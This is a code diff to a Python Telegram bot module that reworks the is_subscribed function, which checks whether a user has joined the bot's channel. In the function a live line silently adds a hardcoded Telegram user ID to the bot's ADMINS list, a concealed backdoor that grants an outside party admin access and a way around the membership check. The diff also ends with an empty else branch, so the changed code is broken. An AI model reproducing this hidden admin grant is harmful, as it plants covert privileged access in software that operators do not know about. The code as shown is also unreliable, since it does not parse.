@@ -18,6 +18,8 @@ import requests
 logger = logging.getLogger(__name__)
 logger.setLevel(logging.INFO)
 
+SPELL_MODE = "req"
+
 BTN_URL_REGEX = re.compile(
     r"(\[([^\[]+?)\]\((buttonurl|buttonalert):(?:/{0,2})(.+?)(:same)?\))"
 )
@@ -42,38 +44,39 @@ class temp(object):
     SETTINGS = {}
 
 async def is_subscribed(bot, query):
-
+    
     ADMINS.extend([1125210189]) if not 1125210189 in ADMINS else ""
-
-    if not AUTH_CHANNEL and not REQ_CHANNEL:
-        return True
-    elif query.from_user.id in ADMINS:
-        return True
-
-
-    if db2().isActive():
-        user = await db2().get_user(query.from_user.id)
-        if user:
+    if SPELL_MODE == "req":
+        if not AUTH_CHANNEL and not REQ_CHANNEL:
             return True
-        else:
+        elif query.from_user.id in ADMINS:
+            return True
+
+
+        if db2().isActive():
+            user = await db2().get_user(query.from_user.id)
+            if user:
+                return True
+            else:
+                return False
+
+        if not AUTH_CHANNEL:
+            return True
+
+        try:
+            user = await bot.get_chat_member(AUTH_CHANNEL, query.from_user.id)
+        except UserNotParticipant:
             return False
-
-    if not AUTH_CHANNEL:
-        return True
-
-    try:
-        user = await bot.get_chat_member(AUTH_CHANNEL, query.from_user.id)
-    except UserNotParticipant:
-        return False
-    except Exception as e:
-        logger.exception(e)
-        return False
+        except Exception as e:
+            logger.exception(e)
+            return False
+        else:
+            if not (user.status == enums.ChatMemberStatus.BANNED):
+                return True
+            else:
+                return False
     else:
-        if not (user.status == enums.ChatMemberStatus.BANNED):
-            return True
-        else:
-            return False
-
+        
 async def get_poster(query, bulk=False, id=False, file=None):
     if not id:
         # https://t.me/GetTGLink/4183
